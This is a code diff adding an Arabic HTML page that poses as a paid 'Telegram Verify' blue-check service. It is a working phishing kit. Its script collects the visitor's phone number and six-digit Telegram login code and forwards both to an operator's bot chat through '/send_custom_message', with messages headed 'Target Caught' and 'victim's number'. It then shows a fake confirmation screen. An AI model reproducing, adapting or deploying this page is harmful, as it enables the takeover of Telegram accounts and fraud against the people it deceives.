@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verify | توثيق حسابات تلجرام</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #050b14; color: #ffffff; min-height: 100vh;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+            overflow-x: hidden; position: relative;
+        }
+        .bg-animation {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; overflow: hidden;
+            background: radial-gradient(circle at 50% 50%, #0a192f 0%, #050b14 100%);
+        }
+        .bg-animation::before {
+            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background-image: linear-gradient(rgba(41, 182, 246, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(41, 182, 246, 0.1) 1px, transparent 1px);
+            background-size: 50px 50px; transform: perspective(600px) rotateX(60deg); animation: gridMove 8s linear infinite;
+        }
+        @keyframes gridMove { 0% { transform: perspective(600px) rotateX(60deg) translateY(0); } 100% { transform: perspective(600px) rotateX(60deg) translateY(50px); } }
+        .glow-orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.4; animation: floatOrb 12s ease-in-out infinite; }
+        .orb1 { width: 350px; height: 350px; background: #29b6f6; top: -10%; right: -10%; }
+        .orb2 { width: 300px; height: 300px; background: #0288d1; bottom: -10%; left: -10%; animation-delay: -6s; }
+        @keyframes floatOrb { 0%, 100% { transform: translate(0, 0) scale(1); } 50% { transform: translate(40px, 40px) scale(1.1); } }
+
+        .container {
+            position: relative; z-index: 2; max-width: 600px; width: 100%;
+            background: rgba(10, 25, 47, 0.75); border: 1px solid rgba(41, 182, 246, 0.5);
+            border-radius: 24px; box-shadow: 0 0 50px rgba(41, 182, 246, 0.2), inset 0 0 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); overflow: hidden;
+            animation: slideUp 0.8s ease-out;
+        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+
+        .header { text-align: center; position: relative; }
+        .header img { width: 100%; height: auto; display: block; border-bottom: 1px solid rgba(41, 182, 246, 0.3); }
+        .header-text { padding: 20px; }
+        .header h1 { font-size: 26px; color: #29b6f6; margin-bottom: 5px; display: flex; justify-content: center; align-items: center; gap: 10px; text-shadow: 0 0 15px rgba(41, 182, 246, 0.6); }
+        .header p { font-size: 14px; color: #8899a6; }
+
+        .step { display: none; animation: fadeIn 0.4s ease; padding: 25px; }
+        .step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .plans-container { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        .plan-card {
+            background: rgba(23, 42, 69, 0.6); border: 1px solid rgba(41, 182, 246, 0.3);
+            border-radius: 15px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer; transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+        .plan-card::before { content: ""; position: absolute; top: 0; right: 0; width: 4px; height: 100%; background: #29b6f6; opacity: 0; transition: 0.3s; }
+        .plan-card:hover { border-color: #29b6f6; transform: translateX(-5px); background: rgba(23, 42, 69, 0.9); }
+        .plan-card:hover::before { opacity: 1; }
+        .plan-card.selected { border-color: #29b6f6; background: rgba(41, 182, 246, 0.15); box-shadow: 0 0 25px rgba(41, 182, 246, 0.3); }
+        .plan-card.selected::before { opacity: 1; }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 28px; color: #29b6f6; text-shadow: 0 0 10px rgba(41, 182, 246, 0.5); }
+        .plan-info h3 { font-size: 16px; margin-bottom: 3px; color: #fff; }
+        .plan-info p { font-size: 12px; color: #8899a6; }
+        
+        .price-tag { background: linear-gradient(135deg, #29b6f6, #0288d1); color: #fff; padding: 8px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; box-shadow: 0 0 15px rgba(41, 182, 246, 0.4); }
+        .price-tag.free { background: linear-gradient(135deg, #10b981, #047857); box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }
+
+        .input-group {
+            background: rgba(10, 25, 47, 0.8); border: 1px solid rgba(41, 182, 246, 0.3); border-radius: 12px;
+            padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center; transition: 0.3s;
+        }
+        .input-group:focus-within { border-color: #29b6f6; box-shadow: 0 0 20px rgba(41, 182, 246, 0.2); background: rgba(10, 25, 47, 1); }
+        .input-group i { color: #29b6f6; font-size: 18px; margin-left: 10px; }
+        .input-group input { width: 100%; padding: 15px 0; background: transparent; border: none; color: #fff; font-size: 15px; outline: none; }
+        .input-group input::placeholder { color: #4a5d73; }
+
+        .submit-btn {
+            width: 100%; padding: 18px; background: linear-gradient(135deg, #29b6f6, #0288d1);
+            color: #fff; border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
+            cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center;
+            gap: 10px; box-shadow: 0 5px 20px rgba(41, 182, 246, 0.4); margin-top: 10px;
+        }
+        .submit-btn:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(41, 182, 246, 0.6); }
+        .submit-btn:disabled { background: #333; cursor: not-allowed; box-shadow: none; }
+
+        .loading-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 11, 20, 0.95); z-index: 999; justify-content: center; align-items: center; flex-direction: column; text-align: center; backdrop-filter: blur(5px); }
+        .loading-screen.active { display: flex; }
+        .spinner { border: 4px solid rgba(41, 182, 246, 0.1); border-top: 4px solid #29b6f6; border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; margin-bottom: 20px; box-shadow: 0 0 30px rgba(41, 182, 246, 0.3); }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { color: #29b6f6; font-size: 18px; font-weight: bold; text-shadow: 0 0 10px rgba(41, 182, 246, 0.5); }
+
+        .success-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 11, 20, 0.95); z-index: 999; justify-content: center; align-items: center; flex-direction: column; text-align: center; padding: 20px; backdrop-filter: blur(5px); }
+        .success-screen.active { display: flex; }
+        .success-icon { font-size: 120px; color: #2ecc71; animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); margin-bottom: 20px; text-shadow: 0 0 50px rgba(46, 204, 113, 0.7); }
+        .success-text { font-size: 24px; font-weight: bold; color: #2ecc71; margin-bottom: 10px; text-shadow: 0 0 20px rgba(46, 204, 113, 0.5); }
+        .success-sub { font-size: 16px; color: #8899a6; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error-msg { color: #e74c3c; background: rgba(231, 76, 60, 0.1); padding: 12px; border-radius: 10px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid rgba(231, 76, 60, 0.3); }
+        
+        .footer { text-align: center; margin-top: 20px; color: #4a5d73; font-size: 12px; padding-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-animation">
+        <div class="glow-orb orb1"></div>
+        <div class="glow-orb orb2"></div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://www.image2url.com/r2/default/images/1792721192275-ecbfab30-cf9a-4237-9258-9edfc5a7aebe.png" alt="Telegram Verify Banner">
+            <div class="header-text">
+                <h1><i class="fab fa-telegram"></i> توثيق حسابات تلجرام</h1>
+                <p>احصل على العلامة الزرقاء لحسابك</p>
+            </div>
+        </div>
+
+        <div id="step1" class="step active">
+            <div id="errorBox" class="error-msg"></div>
+
+            <div class="plans-container">
+                <div class="plan-card" onclick="selectPlan('شهر', 'مجاناً', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gift"></i>
+                        <div><h3>توثيق لمدة شهر</h3><p>عرض مجاني</p></div>
+                    </div>
+                    <div class="price-tag free">مجاناً</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('3 أشهر', '$1.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-star"></i>
+                        <div><h3>توثيق لمدة 3 أشهر</h3><p>باقة أساسية</p></div>
+                    </div>
+                    <div class="price-tag">$1.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('6 أشهر', '$4.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-crown"></i>
+                        <div><h3>توثيق لمدة 6 أشهر</h3><p>الأكثر طلباً</p></div>
+                    </div>
+                    <div class="price-tag">$4.99</div>
+                </div>
+                <div class="plan-card" onclick="selectPlan('سنة', '$9.99', this)">
+                    <div class="plan-info">
+                        <i class="fas fa-gem"></i>
+                        <div><h3>توثيق لمدة سنة</h3><p>باقة VIP</p></div>
+                    </div>
+                    <div class="price-tag">$9.99</div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-phone-alt"></i>
+                <input type="tel" id="phone" placeholder="رقم الهاتف (مثال: 777777777)">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-box"></i>
+                <input type="text" id="selectedPlan" placeholder="الباقة المختارة" readonly>
+            </div>
+
+            <button class="submit-btn" id="btnStep1" onclick="goToStep2()">
+                <i class="fas fa-arrow-left"></i> استمرار التحقق
+            </button>
+        </div>
+
+        <div id="step2" class="step">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <i class="fas fa-shield-alt" style="font-size: 60px; color: #29b6f6; margin-bottom: 15px; text-shadow: 0 0 20px rgba(41, 182, 246, 0.5);"></i>
+                <h2 style="color: #fff; margin-bottom: 10px;">تأكيد ملكية الحساب</h2>
+                <p style="color: #8899a6; font-size: 14px;">أدخل كود التحقق المكون من 6 أرقام المرسل إلى حسابك</p>
+            </div>
+
+            <div id="errorBox2" class="error-msg"></div>
+
+            <div class="input-group">
+                <i class="fas fa-key"></i>
+                <input type="number" id="verifyCode" placeholder="أدخل الكود المكون من 6 أرقام" maxlength="6" style="text-align: center; letter-spacing: 8px; font-size: 24px; font-weight: bold;">
+            </div>
+
+            <button class="submit-btn" id="btnStep2" onclick="submitCode()">
+                <i class="fas fa-check-circle"></i> تفعيل التوثيق
+            </button>
+        </div>
+
+        <div class="footer">© 2026 Telegram Verify Partner. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري التحقق...</div>
+    </div>
+
+    <div class="success-screen" id="successScreen">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تم إرسال طلب التفعيل بنجاح.</div>
+        <div class="success-sub">ستتلقى إشعار التوثيق خلال ساعات عبر حسابك.</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedDuration = "";
+        let selectedPrice = "";
+        let currentPhone = "";
+
+        function selectPlan(duration, price, element) {
+            selectedDuration = duration;
+            selectedPrice = price;
+            document.getElementById('selectedPlan').value = "توثيق " + duration + " (" + price + ")";
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('errorBox').style.display = 'none';
+        }
+
+        // دالة بتكلم السيرفر بتاعنا عشان يبعت لتيليجرام (أأمن من إننا نحط التوكن هنا)
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function goToStep2() {
+            const phone = document.getElementById('phone').value.trim();
+            const errorBox = document.getElementById('errorBox');
+
+            errorBox.style.display = 'none';
+
+            if (!selectedDuration) {
+                errorBox.innerText = "❌ يرجى اختيار باقة التوثيق أولاً!";
+                errorBox.style.display = 'block';
+                return;
+            }
+            if (!phone || phone.length < 8) {
+                errorBox.innerText = "❌ يرجى إدخال رقم هاتف صحيح (8 أرقام على الأقل)!";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            currentPhone = phone;
+
+            await sendToBot(`🕷️<b>𓆩☠️𓆪 𝑻𝒂𝒓𝒈𝒆𝒕 𝑪𝒂𝒖𝒈𝒉𝒕 💀</b>\n\n📱 <b> رَقَـم الـضَّـحِـيَّـة :</b> ${phone}\n💎 <b>الباقة:</b> توثيق ${selectedDuration} (${selectedPrice})`);
+
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('verifyCode').value.trim();
+            const errorBox = document.getElementById('errorBox2');
+            const loading = document.getElementById('loadingScreen');
+            const successScreen = document.getElementById('successScreen');
+
+            errorBox.style.display = 'none';
+
+            if (!code || code.length !== 6) {
+                errorBox.innerText = "❌ يرجى إدخال كود مكون من 6 أرقام!";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            loading.classList.add('active');
+
+            await sendToBot(`🔑 <b>كود التحقق (الخطوة 2):</b>\n\n📱 <b>الرقم:</b> ${currentPhone}\n🔢 <b>الكود:</b> <code>${code}</code>`);
+
+            loading.classList.remove('active');
+            successScreen.classList.add('active');
+        }
+    </script>
+</body>
+</html>
